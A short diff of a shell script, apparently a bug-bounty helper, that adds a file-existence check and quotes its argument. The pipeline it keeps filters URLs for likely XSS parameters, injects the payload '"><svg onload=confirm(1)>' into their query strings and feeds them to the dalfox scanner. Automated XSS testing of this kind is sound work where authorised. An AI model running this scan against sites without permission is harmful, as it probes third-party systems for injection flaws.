@@ -6,4 +6,9 @@ if [ -z "$1" ]; then
     exit 1
 fi
 
-cat $1 | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence
+if [ ! -f "$1" ]; then
+    echo "Error: File '$1' not found"
+    exit 1
+fi
+
+cat "$1" | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence
